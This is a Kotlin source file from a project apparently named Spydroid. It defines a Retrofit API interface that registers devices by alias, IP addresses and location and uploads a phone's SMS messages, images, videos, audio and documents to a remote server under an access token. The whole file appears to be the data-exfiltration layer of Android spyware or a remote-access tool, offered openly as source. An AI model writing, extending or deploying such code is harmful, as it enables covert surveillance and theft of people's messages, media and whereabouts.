/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.common.remote.network.api

import net.spydroid.common.remote.network.models.Devices
import net.spydroid.common.remote.network.models.InfoDevices
import net.spydroid.common.remote.network.models.MultimediaDevices
import net.spydroid.common.remote.network.models.SmsDevices
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.http.GET
import retrofit2.http.Query
import retrofit2.Call
import retrofit2.http.Field
import retrofit2.http.FormUrlEncoded
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part


private object Routes {
    const val DEVICES = "/devices"
    const val INFO = "/info"
    const val MULTIMEDIA = "/multimedia"
    const val SMS = "/sms"
}

private object PARAMS {
    const val ACCESS_TOKEN = "access_token"
    const val ALIAS = "alias"
    const val SEARCH = "search"
}


interface ApiService {

    // GETS
    @GET(Routes.DEVICES)
    fun getDevices(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<Devices>>


    @GET(Routes.DEVICES)
    fun getSpecificDevices(
        @Query(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Query(PARAMS.SEARCH) alias: String
    ): Call<List<Devices>>

    @GET(Routes.INFO)
    fun getInfo(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<InfoDevices>>


    @GET(Routes.INFO)
    fun getSpecificInfo(
        @Query(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Query(PARAMS.SEARCH) alias: String
    ): Call<List<InfoDevices>>

    @GET(Routes.MULTIMEDIA)
    fun getMultimedia(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<MultimediaDevices>>

    @GET(Routes.MULTIMEDIA)
    fun getSpecificMultimedia(
        @Query(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Query(PARAMS.SEARCH) alias: String
    ): Call<List<MultimediaDevices>>

    @GET(Routes.SMS)
    fun getSms(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<SmsDevices>>

    @GET(Routes.SMS)
    fun getSpecificSms(
        @Query(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Query(PARAMS.SEARCH) alias: String
    ): Call<List<SmsDevices>>

    // POSTS
    @FormUrlEncoded
    @POST("devices")
    fun createDevice(
        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Field(PARAMS.ALIAS) alias: String,
        @Field("name") name: String,
        @Field("ip_public") ipPublic: String,
        @Field("ip_private") ipPrivate: String,
        @Field("location") location: String
    ): Call<Void>

    @FormUrlEncoded
    @POST("info")
    fun createInfo(
        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Field(PARAMS.ALIAS) alias: String,
        @Field("ip_public") ipPublic: String,
        @Field("ip_private") ipPrivate: String,
        @Field("location") location: String
    ): Call<Void>

    @FormUrlEncoded
    @POST("multimedia")
    fun createMultimedia(
        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Field(PARAMS.ALIAS) alias: String,
        @Field("route_file") routeFile: String,
        @Field("type") type: String
    ): Call<Void>

    @FormUrlEncoded
    @POST("sms")
    fun createSms(
        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
        @Field(PARAMS.ALIAS) alias: String,
        @Field("sms") sms: String
    ): Call<Void>


    // MULTIPART
    @Multipart
    @POST("/upload/image")
    fun uploadImage(
        @Query("access_token") accessToken: String,
        @Query("alias") alias: String,
        @Part file: MultipartBody.Part,
        @Part("description") description: RequestBody
    ): Call<String>


    @Multipart
    @POST("/upload/video")
    fun uploadVideo(
        @Query("access_token") accessToken: String,
        @Query("alias") alias: String,
        @Part file: MultipartBody.Part,
        @Part("description") description: RequestBody
    ): Call<String>


    @Multipart
    @POST("/upload/audio")
    fun uploadAudio(
        @Query("access_token") accessToken: String,
        @Query("alias") alias: String,
        @Part file: MultipartBody.Part,
        @Part("description") description: RequestBody
    ): Call<String>


    @Multipart
    @POST("/upload/document")
    fun uploadDocument(
        @Query("access_token") accessToken: String,
        @Query("alias") alias: String,
        @Part file: MultipartBody.Part,
        @Part("description") description: RequestBody
    ): Call<String>


}